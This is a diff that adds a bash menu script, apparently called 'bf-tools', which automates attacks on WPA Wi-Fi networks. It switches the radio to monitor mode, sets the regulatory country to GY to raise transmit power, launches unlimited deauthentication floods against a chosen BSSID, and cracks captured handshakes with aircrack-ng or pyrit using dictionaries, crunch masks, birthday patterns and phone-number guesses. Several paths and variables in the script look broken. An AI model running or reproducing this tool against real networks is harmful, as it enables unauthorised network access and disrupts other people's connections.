@@ -1,0 +1,467 @@
+#!/bin/bash
+
+pkill -f aircrack-ng
+pkill -x aircrack-ng
+
+# First run
+if [ -f /usr/bin/bf-tools/firstrun ]; then
+	echo 'export PATH=$PATH":/usr/bin"' >> ~/.profile
+	. ~/.profile
+	ln -s /usr/bin/bf-tools/bf-tool /usr/bin/bf-tool
+	rm /usr/bin/bf-tools/firstrun
+	bf-tool
+fi	
+
+header() {
+	bssid=$(cat /usr/bin/bf-tools/output/lastbssid.txt)
+	password=$(cat /usr/bin/bf-tools/output/password.txt)
+	cd /usr/bin/bf-tools
+	clear
+	echo "*********************************************"
+	tput setaf 10;
+	cat logo.txt
+	tput setaf 7;
+	echo "*********************************************"
+	printf "Target BSSID: [" && tput setaf 10; printf " $bssid" && tput setaf 7; printf " ]"
+	echo""
+	printf "Found password: [" && tput setaf 10; printf " $password" && tput setaf 7; printf " ]"
+	echo ""
+	echo "*********************************************"
+}
+
+mainmenu() {
+	header
+	echo "MAIN MENU:"
+	echo ""
+	echo "1) Bruteforce"
+	echo "2) Wifu"
+	echo ""
+	echo "3) Clean up temporary files"
+	echo ""	
+	read -p "Enter selection: " choice
+	if [ "$choice" == "1" ]; then
+		bruteforce
+	elif [ "$choice" == "2" ]; then
+		wifu
+	elif [ "$choice" == "3" ]; then
+		> /usr/bin/bf-tools/output/password.txt
+		> /usr/bin/bf-tools/output/lastbssid.txt
+	
+	fi
+	mainmenu
+}
+
+bruteforce() {
+	header
+	echo "BRUTEFORCE:"
+	echo ""
+	echo "1)Common dictionary"
+	echo "2)Custom permutations"
+	echo "3)Birthdays"
+	echo "4)Dictionary permutations"
+	echo ""
+	read -p "Enter selection: " choice
+	if [ "$choice" == "1" ]; then
+		commondictionary
+	elif [ "$choice" == "2" ]; then
+		custompermutation
+	elif [ "$choice" == "3" ]; then
+		birthdays
+	elif [ "$choice" == "4" ]; then
+		dictionarypermutations
+	fi
+	mainmenu
+}
+
+############# WIFU #############
+
+wifu() {
+	header
+	echo "WIFU:"
+	echo ""
+	echo "1)START airmon-ng & airodump-ng"
+	echo "2)STOP airmon-ng"
+	echo "3)Deauth"
+	echo ""
+	read -p "Enter selection: " choice
+	if [ "$choice" == "1" ]; then
+		startairmon
+	elif [ "$choice" == "2" ]; then
+		stopairmon
+	elif [ "$choice" == "3" ]; then
+		deauth
+	fi
+	mainmenu
+}
+
+startairmon() {
+	header
+	echo "START AIRMON-NG & AIRODUMP:"
+	echo
+	read -p "Session name: " session
+	read -p "TX-power (max 30): " tx
+	read -p "Channel (1/11 or 'all'); " channel
+	echo "Turning OFF wlan0"
+	ifconfig wlan0 down
+	echo "Stopping all instances of wlan1mon"
+	airmon-ng stop wlan1mon
+	echo "Setting country to GY"
+	iw reg set GY
+	echo "Setting TX-power to $tx"
+	iwconfig wlan1 txpower $tx
+	echo "Turning ON wlan1mon"
+	airmon-ng start wlan1
+	iwconfig wlan1mon txpower $tx
+	if [ "$channel" == "all" ]; then
+		xterm -e airodump-ng wlan1mon -w /usr/bin/bf-tools/output/$session &
+		mainmenu
+	fi
+	xterm -e airodump-ng wlan1mon -w /usr/bin/bf-tools/output/$session -c $channel &
+	mainmenu
+}
+
+stopairmon() {
+	header
+	airmon-ng stop wlan1mon
+	ifconfig wlan0 up
+	mainmenu
+}
+
+deauth() {
+	header
+	echo "DEAUTH ATTACK:"
+	echo ""
+	selectbssid
+	read -p "Channel: " channel
+	xterm -e aireplay-ng --deauth 0 -a $bssid wlan1mon &
+	mainmenu
+}		
+
+############# BRUTEFORCING RUNTIMES ############# 
+
+commondictionary() {
+	selectdictionary
+	selectcap
+	selectbssid
+	selectprogram
+	commondic
+	mainmenu
+}
+
+custompermutation() {
+	selectcap
+	selectbssid
+	selectpermutation
+	selectprogram
+	permutation
+	mainmenu
+}
+
+birthdays() {
+	selectcap
+	selectbssid
+	selectprogram
+	bdaypermutation
+	mainmenu
+}
+
+dictionarypermutations() {
+	selectdictionary
+	selectcap
+	selectbssid
+	selectprogram
+	selectspeed
+	dicpermutation
+	mainmenu
+}
+
+
+############# USER INPUT PROMPTS ############# 
+
+selectpermutation() {
+	header
+	echo "PERMUTATION GENERATOR:"
+	echo ""
+        echo ", will insert upper case characters"
+        echo "% will insert numbers"
+        echo "^ will insert symbols"
+	echo "All other characters will be taken literal"
+	echo ""
+	echo "Example 1; ,@@%%%%^ would crack the password God1234! or 'Liz1986*"
+	echo "Example 2; 020-%%%%%%% or 020%%%%%%% would try any phonenumber in Amsterdam."
+	echo ""
+	read -p "permutation: " permutation
+}
+
+selectdictionary() {
+	header
+	echo "AVAILABLE DICTIONARIES:"
+	cd dictionaries
+	echo ""
+	ls
+	echo ""
+	read -p "dictionary: " dictionary
+	cp -T /usr/bin/bf-tools/dictionaries/$dictionary /usr/bin/bf-tools/dictionaries/tmp.txt
+}
+
+selectcap() {
+	header
+	echo "AVAILABLE .CAP-FILES:"
+	cd /usr/bin/bf-tools/output
+	echo ""
+	ls | grep .cap
+	echo ""
+	read -p ".cap file: " rawcapfile
+	capfile=$(echo $rawcapfile | cut -d. -f 1)
+	aircrack-ng $rawcapfile
+}
+
+selectbssid() {
+	header
+	read -p "Enter target bssid: " bssid
+	echo "$bssid" > /usr/bin/bf-tools/output/lastbssid.txt
+	
+}
+
+selectprogram() {
+	header
+	echo "SELECT CRACKER:"
+	echo ""
+	echo "1) Aircrack" 
+	echo "2) Pyrit (supports OpenCL/CUDA)"
+	echo ""
+	read -p "selection: " choice
+	if [ "$choice" == "1" ]; then
+		prog="aircrack-ng"
+		ext="cap"
+		in="-w-"
+		out="-l"
+		dic="-w"
+		pw="/usr/bin/bf-tools/output/password.txt"
+		
+	elif [ "$choice" == "2" ]; then
+		prog="pyrit"
+		ext="pcap"
+		in="-r"
+		out="-o"
+		dic="-i"
+		pw="/usr/bin/bf-tools/output/password.txt"
+		editcap -F pcap /usr/bin/bf-tools/output/$rawcapfile /usr/bin/bf-tools/output/$capfile.pcap
+	fi
+}
+
+selectspeed() {
+	header
+	echo "SELECT CRACKING EFFICIENCY:"
+	echo ""
+	echo "1) Fast & sloppy"
+	echo "2) Slow & extensive"
+	echo ""
+	read -p "Select choice: " speed
+	> /usr/bin/bf-tools/output/password.txt
+}
+
+############## CRACKING ALGO'S ##############
+
+commondic() {
+	header
+	xterm -e $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $dic /usr/bin/bf-tools/dictionaries/$dictionary $out $pw &
+	checkpw
+	sleep 2
+}
+
+permutation() {
+	xterm -e crunch $ammount $ammount -t $permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+}
+
+ltdpermutation() {
+	header
+	xterm -e crunch $ammount $ammount -t $permutation -e $limit | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+}
+
+dicpermutation() {
+	header
+	echo "Sorting dictionaries and making .tmp file."
+	echo "This could take a while depending on your dictionary." 
+	echo "Please wait..."
+	cd /usr/bin/bf-tools/dictionaries
+	cp /usr/bin/bf-tools/dictionaries/$dictionary /usr/bin/bf-tools/dictionaries/tmp.txt
+	counter
+	# 0 (no permutation)	
+	ammount=$(($count + 0))
+	permutation
+	# 1 (permutations with 1 character)
+	ammount=$(($count + 1))
+	xterm -e crunch $ammount $ammount -t $permutation% | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t %$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t $permutation^ | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t ^$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	checkpw
+	# 2 (permutations with 2 characters)
+	ammount=$(($count + 2))
+	xterm -e crunch $ammount $ammount -t %%$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t ^^$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t %^$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t ^%$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t $permutation%% | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t $permutation^^ | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t $permutation%^ | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t $permutation^% | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t %$permutation% | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t ^$permutation^ | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t %$permutation^ | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t ^$permutation% | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	checkpw
+	# 3 (permutations with 3 characters)
+	ammount=$(($count + 3))
+	xterm -e crunch $ammount $ammount -t $permutation%%% | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t %%%$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t $permutation%%^ | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t ^%%$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t $permutation^%% | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t %%^$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t $permutation^^^ | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	crunch $ammount $ammount -t ^^^$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw
+	checkpw
+	# 4 (permutations with 4 characters)
+	ammount=$(($count + 4))
+	xterm -e crunch $ammount $ammount -t ^^$permutation^^ | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t $permutation%%^^ | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t ^^%%$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t $permutation%%%% | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t %%%%$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t $permutation%%%^ | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t ^%%%$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t $permutation%%%^ | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	xterm -e crunch $ammount $ammount -t ^%%%$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+	checkpw
+	if [ "$speed" == "2" ]; then
+		# 5 (permutations with 5 characters)
+		ammount=$(($count + 5))
+		xterm -e crunch $ammount $ammount -t $permutation%%%%^ | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+		xterm -e crunch $ammount $ammount -t ^%%%%$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+		xterm -e crunch $ammount $ammount -t %%%%$permutation^ | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+		xterm -e crunch $ammount $ammount -t ^$permutation%%%% | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+		xterm -e crunch $ammount $ammount -t %%%%^$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+		xterm -e crunch $ammount $ammount -t $permutation^%%%% | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+		checkpw
+	fi
+	# 6
+	echo -e "$(sed '1d' /usr/bin/bf-tools/dictionaries/tmp.txt)\n" > /usr/bin/bf-tools/output/dictionaries/tmp.txt
+	dicpermutation
+}
+
+bdaypermutation() {
+	header
+	# 1
+	ammount=8
+	permutation=%%-%%-%%
+	limit=32-12-00
+	ltdpermutation
+	# 2
+	ammount=10
+	permutation=%%-%%-19%%
+	limit=32-00-1900
+	ltdpermutation
+	# 3 
+	ammount=10
+	permutation=%%-%%-20%%
+	limit=32-00-2000
+	ltdpermutation
+	# 4
+	ammount=8
+	permutation=%-%-19%% 
+	permutation
+	# 5
+	ammount=8
+	permutation=%-%-20%%
+	permutation
+	# 6
+	ammount=9
+	permutation=%%-%-19%%
+	limit=32-0-1900
+	ltdpermutation
+	# 7
+	ammount=9
+	permutation=%%-%-20%%
+	limit=32-0-2000
+	ltdpermutation
+	# 8
+	ammount=9
+	permutation=%-%%-19%%
+	limit=9-32-1900
+	ltdpermutation
+	# 9
+	ammount=9
+	permutation=%-%%-20%%
+	limit=9-32-2000
+	ltdpermutation
+	#10
+	rm /usr/bin/bf-tools/dictionaries/tmp.txt
+	cp /usr/bin/bf-tools/dictionaries/months.txt /usr/bin/bf-tools/dictionaries/tmp.txt
+	tmp="tmp.txt"
+	# 11 (no permutation)	
+	bdaypermute() {
+		counter
+		ammount=$(($count + 0))
+		xterm -e crunch $ammount $ammount -t $permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+		# 12 (permutations with 1 character)
+		ammount=$(($count + 1))
+		xterm -e crunch $ammount $ammount -t %$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+		ammount=$(($count + 1))
+		xterm -e crunch $ammount $ammount -t $permutation% | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+		# 13 (permutations with 2 character)
+		ammount=$(($count + 2))
+		xterm -e crunch $ammount $ammount -t %%$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/$capfile.$ext $out $pw &
+		ammount=$(($count + 2))
+		xterm -e crunch $ammount $ammount -t $permutation%% | $prog -b $bssid $in /usr/bin/bf-tools/output/output/$capfile.$ext $out $pw &
+		# 14 (permutations with 3 character)
+		ammount=$(($count + 3))
+		xterm -e crunch $ammount $ammount -t %%-$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/output/$capfile.$ext $out $pw &
+		ammount=$(($count + 3))
+		xterm -e crunch $ammount $ammount -t $permutation-%% | $prog -b $bssid $in /usr/bin/bf-tools/output/output/$capfile.$ext $out $pw &
+		# 15 (permutations with 4 character)
+		ammount=$(($count + 4))
+		xterm -e crunch $ammount $ammount -t %%%%$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/output/$capfile.$ext $out $pw &
+		ammount=$(($count + 4))
+		xterm -e crunch $ammount $ammount -t $permutation%%%% | $prog -b $bssid $in /usr/bin/bf-tools/output/output/$capfile.$ext $out $pw &
+		# 15 (permutations with 5 character)
+		ammount=$(($count + 5))
+		xterm -e crunch $ammount $ammount -t %%%%-$permutation | $prog -b $bssid $in /usr/bin/bf-tools/output/output/$capfile.$ext $out $pw &
+		ammount=$(($count + 5))
+		xterm -e crunch $ammount $ammount -t $permutation-%%%% | $prog -b $bssid $in /usr/bin/bf-tools/output/output/$capfile.$ext $out $pw &
+		checkpw
+		echo -e "$(sed '1d' /usr/bin/bf-tools/dictionaries/tmp.txt)\n" > /usr/bin/bf-tools/output/dictionaries/tmp.txt
+		bdaypermute
+	}
+	bdaypermute
+	mainmenu
+}
+
+
+######## ALGO-TOOLS
+
+counter() {
+	permutation=$(head -n 1 /usr/bin/bf-tools/dictionaries/tmp.txt)
+	count=$(echo ${#permutation})
+	if [ "$count" == "0" ]; then
+		echo "All permutations completed, password not found."
+		read -p "Press ENTER to exit to main menu." empty
+		mainmenu
+	fi
+}
+
+checkpw(){
+	if [ -s $pw ]; then
+		pkill aircrack-ng
+		password=$(cat $pw)
+		mainmenu
+	fi
+	
+}
+
+
+######## RUNTIME
+
+mainmenu
+
